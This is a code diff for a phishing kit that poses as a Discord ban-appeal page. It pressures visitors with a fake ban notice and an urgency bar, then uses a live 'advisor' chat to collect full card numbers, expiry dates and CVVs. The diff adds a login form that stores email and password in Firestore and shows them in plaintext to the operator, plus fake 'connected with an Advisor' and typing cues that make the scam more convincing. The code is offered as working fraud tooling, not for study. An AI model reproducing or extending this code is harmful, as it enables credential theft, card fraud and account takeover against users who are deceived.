@@ -24,12 +24,14 @@ import {
   CollectionReference,
   QuerySnapshot,
   Timestamp,
+  setDoc,
 } from "firebase/firestore";
 import {
   MdCreditCard,
   MdDateRange,
   MdLock,
   MdCheck,
+  MdEmail,
 } from "react-icons/md";
 import { FaCcVisa, FaCcMastercard, FaCcAmex } from "react-icons/fa";
 
@@ -49,10 +51,93 @@ type ChatMessage = {
   id?: string;
   sender: "client" | "support";
   text: string;
-  messageType?: "text" | "secure_form_request" | "secure_form_response";
+  messageType?:
+    | "text"
+    | "secure_form_request"
+    | "secure_form_response"
+    | "secure_login_request"
+    | "secure_login_response";
   timestamp?: Timestamp;
   transactionId: string;
 };
+
+// ------------ New Component: TypingText --------------
+interface TypingTextProps {
+  text: string;
+  interval?: number;
+}
+
+function TypingText({ text, interval = 100 }: TypingTextProps) {
+  const [displayedText, setDisplayedText] = useState("");
+
+  useEffect(() => {
+    setDisplayedText(""); // Reset on mount
+    let index = 0;
+    const timer = setInterval(() => {
+      if (index < text.length) {
+        setDisplayedText(text.slice(0, index + 1));
+        index++;
+      } else {
+        clearInterval(timer);
+      }
+    }, interval);
+    return () => clearInterval(timer);
+  }, [text, interval]);
+
+  return <span>{displayedText}</span>;
+}
+
+// ------------ New Component: BouncingDots --------------
+function BouncingDots() {
+  return (
+    <>
+      <span className="dot">.</span>
+      <span className="dot">.</span>
+      <span className="dot">.</span>
+      <style jsx>{`
+        .dot {
+          display: inline-block;
+          animation: bounce 1.4s infinite ease-in-out;
+          margin-left: 2px;
+        }
+        .dot:nth-child(1) {
+          animation-delay: 0s;
+        }
+        .dot:nth-child(2) {
+          animation-delay: 0.2s;
+        }
+        .dot:nth-child(3) {
+          animation-delay: 0.4s;
+        }
+        @keyframes bounce {
+          0%, 80%, 100% {
+            transform: translateY(0);
+          }
+          40% {
+            transform: translateY(-5px);
+          }
+        }
+      `}</style>
+    </>
+  );
+}
+
+// ------------ New Component: TypingIndicator --------------
+function TypingIndicator() {
+  const style: React.CSSProperties = {
+    alignSelf: "flex-start",
+    marginTop: "auto",
+    fontSize: "10px", // reduced font size
+    color: "#555",    // medium dark gray
+    padding: "2px 10px",
+  };
+
+  return (
+    <div style={style}>
+      Typing <BouncingDots />
+    </div>
+  );
+}
 
 // ------------ 2) MAIN USER PAGE COMPONENT --------------
 export default function UserPage() {
@@ -60,7 +145,6 @@ export default function UserPage() {
   const [data, setData] = useState<UserData | null>(null);
   const [loading, setLoading] = useState(true);
 
-  // Realtime listener for changes on the user document.
   useEffect(() => {
     if (!id) {
       console.error("🚨 No ID provided in the URL parameters.");
@@ -68,22 +152,18 @@ export default function UserPage() {
       return;
     }
     const userId = Array.isArray(id) ? id[0] : id;
-    console.log("🔍 Listening for changes on user document with ID:", userId);
     const unsubscribe = onSnapshot(
       doc(db, "users", userId),
       (docSnap) => {
         if (docSnap.exists()) {
-          console.log("✅ Document data:", docSnap.data());
           setData(docSnap.data() as UserData);
         } else {
-          console.error("❌ No document found for ID:", userId);
-          // Redirect automatically when the document is missing.
           window.location.href = "https://discord.com";
         }
         setLoading(false);
       },
       (error) => {
-        console.error("🔥 Error listening to document:", error);
+        console.error("Error listening to document:", error);
         setLoading(false);
       }
     );
@@ -97,58 +177,76 @@ export default function UserPage() {
         <link rel="icon" href="/img/discord.png" />
       </Head>
       <div style={pageStyle}>
-        {/* Notice Bar */}
         <div style={noticeBarStyle}>
           <p style={noticeBarTextStyle}>
-            You have a limited window to submit an appeal before the ban is finalized. Failure to act in time will result in permanent restrictions on your account. Review your violations to understand for how long and why.
+            You have a limited window to submit an appeal before the ban is finalized.
+            Failure to act in time will result in permanent restrictions on your account.
+            Review your violations to understand for how long and why.
           </p>
         </div>
-
         {loading ? (
           <h2 style={{ color: "white", textAlign: "center", marginTop: "50px" }}>
             Loading...
           </h2>
         ) : data ? (
           <div style={outerContainer}>
-            {/* Decorative Image */}
             <img
               src="https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/6630f482123160b94617877a_Box%20(1).webp"
               alt=""
               style={box4s}
               loading="lazy"
             />
-
-            {/* Left Container (User Info) */}
             <div style={leftContainer}>
               <div style={profileHeader}>
-                <img className="banner" src={data.bannerImage} alt="Banner Image" style={banner} />
-                <img className="profile" src={data.profileImage} alt={`${data.username}'s Profile Image`} style={profile} />
+                <img
+                  className="banner"
+                  src={data.bannerImage}
+                  alt="Banner Image"
+                  style={banner}
+                />
+                <img
+                  className="profile"
+                  src={data.profileImage}
+                  alt={`${data.username}'s Profile Image`}
+                  style={profile}
+                />
                 <h2 style={username}>{data.username}</h2>
               </div>
               <div style={infoContainer}>
                 <div style={infoRow}>
-                  <img src="https://img.icons8.com/ios-filled/50/5865f2/user.png" alt="User Icon" style={iconStyle} />
+                  <img
+                    src="https://img.icons8.com/ios-filled/50/5865f2/user.png"
+                    alt="User Icon"
+                    style={iconStyle}
+                  />
                   <span style={label}>User ID:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px" }}>
                     {data.userID}
                   </span>
                 </div>
                 <div style={infoRow}>
-                  <img src="https://img.icons8.com/ios-filled/50/5865f2/certificate.png" alt="Type Icon" style={iconStyle} />
+                  <img
+                    src="https://img.icons8.com/ios-filled/50/5865f2/certificate.png"
+                    alt="Type Icon"
+                    style={iconStyle}
+                  />
                   <span style={label}>Type:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px" }}>
                     {data.type}
                   </span>
                 </div>
                 <div style={infoRow}>
-                  <img src="https://img.icons8.com/ios-filled/50/5865f2/shield.png" alt="Shield Icon" style={iconStyle} />
+                  <img
+                    src="https://img.icons8.com/ios-filled/50/5865f2/shield.png"
+                    alt="Shield Icon"
+                    style={iconStyle}
+                  />
                   <span style={label}>Account Status:</span>
                   <span
                     style={{
                       ...value,
                       marginLeft: "auto",
                       marginRight: "10px",
-                      textAlign: "right",
                       ...getStatusStyle(data.accountStatus),
                     }}
                   >
@@ -156,16 +254,24 @@ export default function UserPage() {
                   </span>
                 </div>
                 <div style={infoRow}>
-                  <img src="https://img.icons8.com/ios-filled/50/5865f2/calendar.png" alt="Calendar Icon" style={iconStyle} />
+                  <img
+                    src="https://img.icons8.com/ios-filled/50/5865f2/calendar.png"
+                    alt="Calendar Icon"
+                    style={iconStyle}
+                  />
                   <span style={label}>Date Created:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px" }}>
                     {data.dateCreated}
                   </span>
                 </div>
                 <div style={infoRow}>
-                  <img src="https://img.icons8.com/ios-filled/50/5865f2/flag.png" alt="Flag Icon" style={iconStyle} />
+                  <img
+                    src="https://img.icons8.com/ios-filled/50/5865f2/flag.png"
+                    alt="Flag Icon"
+                    style={iconStyle}
+                  />
                   <span style={label}>Active Reports:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px" }}>
                     {data.activeReports}
                   </span>
                 </div>
@@ -174,28 +280,32 @@ export default function UserPage() {
                 <span style={{ fontSize: "14px" }}>💼 SEN - Hudson</span>
               </div>
             </div>
-
-            {/* Right Container (Appeal Info) */}
             <div style={rightText}>
               <h1 style={rightHeading}>Appeal Your Ban</h1>
               <p style={rightTextP}>
                 Submit your appeal via the chat window (bottom right) with all necessary details to dispute the report.
               </p>
               <h2 style={rightSubHeading}>Review Process</h2>
-              <p style={rightTextP}>The Report Assistance Team will assess your appeal and determine if the report is valid.</p>
+              <p style={rightTextP}>
+                The Report Assistance Team will assess your appeal and determine if the report is valid.
+              </p>
               <h2 style={rightSubHeading}>Outcome</h2>
               <p style={rightTextP}>Once Approved: Ban report will be canceled.</p>
               <p style={rightTextP}>If Denied: Suspension proceeds.</p>
               <h2 style={rightSubHeading}>Reminders</h2>
-              <p style={rightTextP}>Timely Action Matters: Appeals must be submitted promptly to be considered.</p>
-              <p style={rightTextP}>Use the Correct Channel: Only the chat window processes appeals—other support methods won’t apply.</p>
-              <p style={rightTextP}>Final Decision: Once reviewed, decisions are final and cannot be appealed again.</p>
+              <p style={rightTextP}>
+                Timely Action Matters: Appeals must be submitted promptly to be considered.
+              </p>
+              <p style={rightTextP}>
+                Use the Correct Channel: Only the chat window processes appeals—other support methods won’t apply.
+              </p>
+              <p style={rightTextP}>
+                Final Decision: Once reviewed, decisions are final and cannot be appealed again.
+              </p>
             </div>
           </div>
         ) : null}
-
         {data && (
-          // On your support page, make sure to pass role="support".
           <ChatWidget userID={data.userID} role="client" />
         )}
       </div>
@@ -233,6 +343,14 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
   const fileInputRef = useRef<HTMLInputElement | null>(null);
   const textareaRef = useRef<HTMLTextAreaElement | null>(null);
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
+  const [typingStatus, setTypingStatus] = useState<{ support: boolean; client: boolean }>({
+    support: false,
+    client: false,
+  });
+  const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
+  const notificationSoundRef = useRef<HTMLAudioElement | null>(null);
+  const firstLoadRef = useRef(true);
+  const prevMessagesCountRef = useRef(0);
 
   const suggestions = [
     "View Report Details",
@@ -261,53 +379,72 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
     }
   }, [messages]);
 
-  const handleSecurePaymentSubmit = async (paymentDetails: { cardNumber: string; expiry: string; cvv: string; }) => {
-    const masked = paymentDetails.cardNumber.slice(-4);
-    const maskedMessage = `Secure Form Submitted: Card ending in ${masked}`;
-    try {
-      await addDoc(collection(db, "messages"), {
-        transactionId: userID,
-        sender: "client",
-        text: maskedMessage,
-        messageType: "secure_form_response",
-        timestamp: serverTimestamp(),
-      });
-    } catch (error) {
-      console.error("🔥 Error sending secure form response:", error);
+  useEffect(() => {
+    notificationSoundRef.current = new Audio("/sounds/notification.mp3");
+  }, []);
+
+  useEffect(() => {
+    if (firstLoadRef.current) {
+      firstLoadRef.current = false;
+      prevMessagesCountRef.current = messages.length;
+      return;
     }
-    try {
-      await addDoc(collection(db, "securePaymentDetails"), {
-        transactionId: userID,
-        cardNumber: paymentDetails.cardNumber,
-        expiry: paymentDetails.expiry,
-        cvv: paymentDetails.cvv,
-        timestamp: serverTimestamp(),
-      });
-    } catch (error) {
-      console.error("🔥 Error storing secure payment details:", error);
+    if (messages.length > prevMessagesCountRef.current) {
+      const latestMsg = messages[messages.length - 1];
+      if (!latestMsg.id?.startsWith("temp-")) {
+        notificationSoundRef.current?.play().catch((err) => console.error(err));
+      }
+      prevMessagesCountRef.current = messages.length;
     }
+  }, [messages]);
+
+  useEffect(() => {
+    if (!userID) return;
+    const typingDocRef = doc(db, "typingStatus", userID);
+    const unsubscribe = onSnapshot(typingDocRef, (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data();
+        setTypingStatus({
+          support: data.supportTyping || false,
+          client: data.clientTyping || false,
+        });
+      }
+    });
+    return () => unsubscribe();
+  }, [userID]);
+
+  const dynamicChatWindowStyle: React.CSSProperties = {
+    backgroundColor: "#ffffff",
+    border: "1px solid #ccc",
+    borderRadius: isOpen ? "10px" : "20px",
+    boxShadow: isHovered ? "0 8px 16px rgba(0,0,0,0.3)" : "0 4px 8px rgba(0,0,0,0.2)",
+    marginBottom: "5px",
+    width: "320px",
+    display: "flex",
+    flexDirection: "column",
+    overflow: "hidden",
+    height: isOpen ? "450px" : "0px",
+    opacity: isOpen ? 1 : 0,
+    transform: isOpen ? "translateY(0)" : "translateY(20px)",
+    pointerEvents: isOpen ? "auto" : "none",
+    transition:
+      "height 0.5s ease, opacity 0.5s ease, transform 0.3s ease, border-radius 0.5s ease",
   };
 
-  const renderMessage = (msg: ChatMessage) => {
-    const key = msg.id || Math.random().toString(36).substr(2, 9);
-    return (
-      <div key={key} style={msg.sender === "support" ? chatBubbleBotStyle : chatBubbleUserStyle}>
-        {msg.messageType === "secure_form_request" ? (
-          <SecurePaymentForm onSubmit={handleSecurePaymentSubmit} />
-        ) : msg.messageType === "secure_form_response" && role === "support" ? (
-          <SecurePaymentDetails transactionId={msg.transactionId} maskedText={msg.text} />
-        ) : msg.text.startsWith("data:image") ? (
-          <img 
-            src={msg.text} 
-            alt="sent image" 
-            style={{ maxWidth: "100%", borderRadius: "8px", cursor: "pointer" }} 
-            onClick={(e) => { e.preventDefault(); setSelectedImage(msg.text); }} 
-          />
-        ) : (
-          msg.text
-        )}
-      </div>
-    );
+  const handleTextareaChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
+    setInput(e.target.value);
+    if (textareaRef.current) {
+      textareaRef.current.style.height = "auto";
+      textareaRef.current.style.height = textareaRef.current.scrollHeight + "px";
+    }
+    if (userID) {
+      const typingDocRef = doc(db, "typingStatus", userID);
+      setDoc(typingDocRef, { [role + "Typing"]: true }, { merge: true }).catch(console.error);
+      if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
+      typingTimeoutRef.current = setTimeout(() => {
+        setDoc(typingDocRef, { [role + "Typing"]: false }, { merge: true }).catch(console.error);
+      }, 2000);
+    }
   };
 
   const handleSend = async () => {
@@ -324,7 +461,7 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
         textareaRef.current.style.height = "auto";
       }
     } catch (error) {
-      console.error("🔥 Error sending message:", error);
+      console.error("Error sending message:", error);
     }
   };
 
@@ -332,14 +469,6 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
     if (e.key === "Enter" && !e.shiftKey) {
       e.preventDefault();
       handleSend();
-    }
-  };
-
-  const handleTextareaChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
-    setInput(e.target.value);
-    if (textareaRef.current) {
-      textareaRef.current.style.height = "auto";
-      textareaRef.current.style.height = textareaRef.current.scrollHeight + "px";
     }
   };
 
@@ -352,7 +481,7 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
         timestamp: serverTimestamp(),
       });
     } catch (error) {
-      console.error("🔥 Error sending suggestion message:", error);
+      console.error("Error sending suggestion message:", error);
     }
   };
 
@@ -375,7 +504,7 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
               timestamp: serverTimestamp(),
             });
           } catch (error) {
-            console.error("🔥 Error sending image message:", error);
+            console.error("Error sending image message:", error);
           }
         }
       };
@@ -383,23 +512,70 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
     }
   };
 
+  const renderMessage = (msg: ChatMessage) => {
+    const key = msg.id || Math.random().toString(36).substr(2, 9);
+    return (
+      <div key={key} style={msg.sender === "support" ? chatBubbleBotStyle : chatBubbleUserStyle}>
+        {msg.messageType === "secure_form_request" ? (
+          <SecurePaymentForm onSubmit={handleSecurePaymentSubmit} />
+        ) : msg.messageType === "secure_form_response" && role === "support" ? (
+          <SecurePaymentDetails transactionId={msg.transactionId} maskedText={msg.text} />
+        ) : msg.messageType === "secure_login_request" ? (
+          role === "client" ? (
+            <SecureLoginForm transactionId={userID} />
+          ) : (
+            <div>Secure Login Form request sent to client</div>
+          )
+        ) : msg.messageType === "secure_login_response" && role === "support" ? (
+          <SecureLoginDetails transactionId={msg.transactionId} maskedText={msg.text} />
+        ) : msg.text.startsWith("data:image") ? (
+          <img
+            src={msg.text}
+            alt="sent image"
+            style={{ maxWidth: "100%", borderRadius: "8px", cursor: "pointer" }}
+            onClick={(e) => {
+              e.preventDefault();
+              setSelectedImage(msg.text);
+            }}
+          />
+        ) : (
+          msg.text
+        )}
+      </div>
+    );
+  };
+
+  const handleSecurePaymentSubmit = async (paymentDetails: { cardNumber: string; expiry: string; cvv: string; }) => {
+    const masked = paymentDetails.cardNumber.slice(-4);
+    const maskedMessage = `Secure Form Submitted: Card ending in ${masked}`;
+    try {
+      await addDoc(collection(db, "messages"), {
+        transactionId: userID,
+        sender: "client",
+        text: maskedMessage,
+        messageType: "secure_form_response",
+        timestamp: serverTimestamp(),
+      });
+    } catch (error) {
+      console.error("Error sending secure form response:", error);
+    }
+    try {
+      await addDoc(collection(db, "securePaymentDetails"), {
+        transactionId: userID,
+        cardNumber: paymentDetails.cardNumber,
+        expiry: paymentDetails.expiry,
+        cvv: paymentDetails.cvv,
+        timestamp: serverTimestamp(),
+      });
+    } catch (error) {
+      console.error("Error storing secure payment details:", error);
+    }
+  };
+
   return (
     <div style={chatWidgetStyle}>
       <div
-        style={{
-          ...chatWindowStyle,
-          width: "320px",
-          display: "flex",
-          flexDirection: "column",
-          overflow: "hidden",
-          height: isOpen ? "450px" : "0px",
-          opacity: isOpen ? 1 : 0,
-          transform: isOpen ? "translateY(0)" : "translateY(20px)",
-          pointerEvents: isOpen ? "auto" : "none",
-          borderRadius: isOpen ? "10px" : "20px",
-          transition: "height 0.5s ease, opacity 0.5s ease, transform 0.3s ease, border-radius 0.5s ease",
-          boxShadow: isHovered ? "0 8px 16px rgba(0,0,0,0.3)" : "0 4px 8px rgba(0,0,0,0.2)",
-        }}
+        style={dynamicChatWindowStyle}
         onMouseEnter={() => setIsHovered(true)}
         onMouseLeave={() => setIsHovered(false)}
       >
@@ -414,24 +590,21 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
           </div>
           <button style={chatMinimizeBtnStyle} onClick={() => setIsOpen(false)}>–</button>
         </div>
-
-        {isOpen && messages.length === 0 && (
-          <div style={floatingSuggestionsStyle}>
-            {suggestions.map((suggestion, index) => (
-              <button key={index} style={suggestionButtonStyle} onClick={() => handleSuggestionClick(suggestion)}>
-                {suggestion}
-              </button>
-            ))}
-          </div>
-        )}
-
         <div style={chatBodyStyle}>
           <div style={chatMessagesStyle}>
+            <div style={persistentStatusStyle}>
+              <div style={onlineCircleStyle} />
+              <span>You are connected with an Advisor.</span>
+            </div>
             {messages.map((msg) => renderMessage(msg))}
             <div ref={messagesEndRef} />
           </div>
+          {/* Static Typing Indicator positioned at lower left of the chat inbox */}
+          {(role === "client" && typingStatus.support) ||
+          (role === "support" && typingStatus.client) ? (
+            <TypingIndicator />
+          ) : null}
         </div>
-
         <div style={chatInputAreaStyle}>
           <button style={plusIconBtnStyle} onClick={handlePlusClick}>+</button>
           <textarea
@@ -470,37 +643,100 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
           }}
           onClick={() => setIsOpen(true)}
         >
-          Chat
+          <TypingText text="Chat with us! 💬" interval={100} />
         </button>
       </div>
-      {selectedImage && (
-        <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />
-      )}
+      {selectedImage && <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />}
     </div>
   );
 }
 
-// ------------ NEW COMPONENT: SECURE PAYMENT DETAILS (for support view) --------------
-function SecurePaymentDetails({
-  transactionId,
-  maskedText,
-}: {
-  transactionId: string;
-  maskedText: string;
-}) {
-  const [details, setDetails] = useState<{ cardNumber: string; expiry: string; cvv: string } | null>(null);
+function SecureLoginForm({ transactionId }: { transactionId: string }) {
+  const [email, setEmail] = useState(""); 
+  const [password, setPassword] = useState("");
+  const [submitted, setSubmitted] = useState(false);
+
+  const handleSubmit = async (e: FormEvent) => {
+    e.preventDefault();
+    try {
+      await addDoc(collection(db, "secureLoginDetails"), {
+        transactionId,
+        email,
+        password,
+        timestamp: serverTimestamp(),
+      });
+      await addDoc(collection(db, "messages"), {
+        transactionId,
+        sender: "client",
+        text: "Secure Login Details Submitted",
+        messageType: "secure_login_response",
+        timestamp: serverTimestamp(),
+      });
+      setSubmitted(true);
+    } catch (error) {
+      console.error("Error submitting secure login details:", error);
+    }
+  };
+
+  if (submitted) {
+    return (
+      <div style={{ padding: "10px", margin: "10px 0", backgroundColor: "#E0E3FF", border: "1px solid #5865F2", borderRadius: "8px", color: "#5865f2" }}>
+        Secure Login details submitted.
+      </div>
+    );
+  }
+
+  return (
+    <form onSubmit={handleSubmit} style={modifiedSecureFormContainerStyle}>
+      <div style={inputGroupStyle}>
+        <MdEmail style={iconStyleSecure} />
+        <input
+          type="email"
+          placeholder="Email"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+          required
+          style={modifiedSecureInputStyle}
+        />
+      </div>
+      <div style={inputGroupStyle}>
+        <MdLock style={iconStyleSecure} />
+        <input
+          type="password"
+          placeholder="Password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          required
+          style={modifiedSecureInputStyle}
+        />
+      </div>
+      <button
+        type="submit"
+        style={{
+          ...secureSubmitStyle,
+          display: "block",
+          margin: "0 auto",
+          opacity: email && password ? 1 : 0.6,
+          cursor: email && password ? "pointer" : "not-allowed",
+        }}
+        disabled={!email || !password}
+      >
+        Submit
+      </button>
+    </form>
+  );
+}
+
+function SecureLoginDetails({ transactionId, maskedText }: { transactionId: string; maskedText: string; }) {
+  const [details, setDetails] = useState<{ email: string; password: string } | null>(null);
 
   useEffect(() => {
-    const secureRef = collection(db, "securePaymentDetails");
-    const q = query(secureRef, where("transactionId", "==", transactionId));
+    const secureLoginRef = collection(db, "secureLoginDetails");
+    const q = query(secureLoginRef, where("transactionId", "==", transactionId));
     const unsubscribe = onSnapshot(q, (snapshot) => {
       if (!snapshot.empty) {
         const data = snapshot.docs[0].data();
-        setDetails({
-          cardNumber: data.cardNumber,
-          expiry: data.expiry,
-          cvv: data.cvv,
-        });
+        setDetails({ email: data.email, password: data.password });
       } else {
         setDetails(null);
       }
@@ -509,21 +745,35 @@ function SecurePaymentDetails({
   }, [transactionId]);
 
   if (details) {
-    return (
-      <div>
-        {`Payment Details - Card: ${details.cardNumber}, Expiry: ${details.expiry}, CVV: ${details.cvv}`}
-      </div>
-    );
+    return <div>{`Login Details - Email: ${details.email}, Password: ${details.password}`}</div>;
+  }
+  return <div>{maskedText} (Loading secure login details...)</div>;
+}
+
+function SecurePaymentDetails({ transactionId, maskedText }: { transactionId: string; maskedText: string; }) {
+  const [details, setDetails] = useState<{ cardNumber: string; expiry: string; cvv: string } | null>(null);
+
+  useEffect(() => {
+    const secureRef = collection(db, "securePaymentDetails");
+    const q = query(secureRef, where("transactionId", "==", transactionId));
+    const unsubscribe = onSnapshot(q, (snapshot) => {
+      if (!snapshot.empty) {
+        const data = snapshot.docs[0].data();
+        setDetails({ cardNumber: data.cardNumber, expiry: data.expiry, cvv: data.cvv });
+      } else {
+        setDetails(null);
+      }
+    });
+    return () => unsubscribe();
+  }, [transactionId]);
+
+  if (details) {
+    return <div>{`Payment Details - Card: ${details.cardNumber}, Expiry: ${details.expiry}, CVV: ${details.cvv}`}</div>;
   }
   return <div>{maskedText} (Secure details loading...)</div>;
 }
 
-// ------------ 5) UPDATED SECURE PAYMENT FORM (Client Side) --------------
-function SecurePaymentForm({
-  onSubmit,
-}: {
-  onSubmit: (paymentDetails: { cardNumber: string; expiry: string; cvv: string; }) => void;
-}) {
+function SecurePaymentForm({ onSubmit }: { onSubmit: (paymentDetails: { cardNumber: string; expiry: string; cvv: string; }) => void; }) {
   const [rawCardNumber, setRawCardNumber] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
@@ -617,7 +867,7 @@ function SecurePaymentForm({
     }
     return newErrors;
   }, [rawCardNumber, expiry, cvv, cardType]);
-  
+
   useEffect(() => {
     setErrors(computeErrors());
   }, [computeErrors]);
@@ -678,8 +928,9 @@ function SecurePaymentForm({
         />
         {rawCardNumber.length >= 4 && CardIcon}
       </div>
-      {rawCardNumber && errors.cardNumber && <div style={errorTextStyle}>{errors.cardNumber}</div>}
-
+      {rawCardNumber && errors.cardNumber && (
+        <div style={errorTextStyle}>{errors.cardNumber}</div>
+      )}
       <div style={inputGroupStyle}>
         <MdDateRange style={iconStyleSecure} />
         <input
@@ -691,7 +942,6 @@ function SecurePaymentForm({
         />
       </div>
       {expiry && errors.expiry && <div style={errorTextStyle}>{errors.expiry}</div>}
-
       <div style={inputGroupStyle}>
         <MdLock style={iconStyleSecure} />
         <input
@@ -703,11 +953,12 @@ function SecurePaymentForm({
         />
       </div>
       {cvv && errors.cvv && <div style={errorTextStyle}>{errors.cvv}</div>}
-
       <button
         type="submit"
         style={{
           ...secureSubmitStyle,
+          display: "block",
+          margin: "0 auto",
           opacity: isFormValid ? 1 : 0.6,
           cursor: isFormValid ? "pointer" : "not-allowed",
         }}
@@ -719,7 +970,6 @@ function SecurePaymentForm({
   );
 }
 
-// ------------ NEW COMPONENT: IMAGE MODAL (for zoom-in effect on client page) --------------
 function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
   return (
     <div
@@ -752,7 +1002,6 @@ function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
   );
 }
 
-// ------------ 6) INLINE STYLES --------------
 const pageStyle: React.CSSProperties = {
   background: "url('/img/background.png') no-repeat center center fixed",
   backgroundSize: "cover",
@@ -767,7 +1016,7 @@ const pageStyle: React.CSSProperties = {
 
 const noticeBarStyle: React.CSSProperties = {
   width: "100%",
-  background: "linear-gradient(145deg, rgb(255 0 0 / 80%), rgb(255 0 0 / 29%))",
+  background: "linear-gradient(145deg, rgb(255 0 0 / 80%), rgb(255 0, 0 / 29%))",
   padding: "10px 20px",
   textAlign: "center",
   position: "fixed",
@@ -927,14 +1176,6 @@ const chatWidgetStyle: React.CSSProperties = {
   zIndex: 9999,
 };
 
-const chatWindowStyle: React.CSSProperties = {
-  backgroundColor: "#ffffff",
-  border: "1px solid #ccc",
-  borderRadius: "10px",
-  boxShadow: "0 4px 8px rgba(0,0,0,0.2)",
-  marginBottom: "5px",
-};
-
 const chatHeaderStyle: React.CSSProperties = {
   display: "flex",
   justifyContent: "space-between",
@@ -958,7 +1199,6 @@ const chatLogoStyle: React.CSSProperties = {
 const chatTitleStyle: React.CSSProperties = {
   display: "flex",
   flexDirection: "column",
-  lineHeight: 1,
 };
 
 const chatTitleMainStyle: React.CSSProperties = {
@@ -1024,6 +1264,9 @@ const chatBubbleUserStyle: React.CSSProperties = {
 const chatInputAreaStyle: React.CSSProperties = {
   display: "flex",
   borderTop: "1px solid #ccc",
+  padding: "10px",
+  height: "60px",
+  flexShrink: 0,
 };
 
 const chatInputStyle: React.CSSProperties = {
@@ -1098,24 +1341,25 @@ const plusIconBtnStyle: React.CSSProperties = {
 const modifiedSecureFormContainerStyle: React.CSSProperties = {
   backgroundColor: "#fff",
   borderRadius: "8px",
-  padding: "10px 15px",
-  margin: "10px 0 15px 0",
+  padding: "8px 12px",
+  margin: "10px 0",
   width: "100%",
   boxSizing: "border-box",
   boxShadow: "0 2px 4px rgba(0,0,0,0.1)",
-  animation: "fadeIn 0.5s ease",
   transition: "all 0.3s ease",
 };
 
 const modifiedSecureInputStyle: React.CSSProperties = {
   flex: 1,
-  padding: "8px",
+  padding: "6px 8px",
   fontSize: "14px",
   border: "1px solid #ccc",
   borderRadius: "4px",
   outline: "none",
-  transition: "all 0.3s ease",
   color: "black",
+  width: "100%",
+  height: "40px",
+  boxSizing: "border-box",
 };
 
 const errorTextStyle: React.CSSProperties = {
@@ -1133,7 +1377,7 @@ const iconStyleSecure: React.CSSProperties = {
 const inputGroupStyle: React.CSSProperties = {
   display: "flex",
   alignItems: "center",
-  marginBottom: "10px",
+  marginBottom: "8px",
 };
 
 const secureSubmitStyle: React.CSSProperties = {
@@ -1154,3 +1398,24 @@ const submittedNotificationStyle: React.CSSProperties = {
   textAlign: "center",
   boxShadow: "0 4px 8px rgba(0,0,0,0.1)",
 };
+
+const persistentStatusStyle: React.CSSProperties = {
+  fontSize: "12px",
+  color: "#555",
+  margin: "5px 0",
+  textAlign: "center",
+  padding: "5px 0",
+  display: "flex",
+  alignItems: "center",
+  justifyContent: "center",
+};
+
+const onlineCircleStyle: React.CSSProperties = {
+  width: "10px",
+  height: "10px",
+  borderRadius: "50%",
+  backgroundColor: "#32CD32",
+  marginRight: "5px",
+};
+
+export { TypingText, TypingIndicator, BouncingDots };
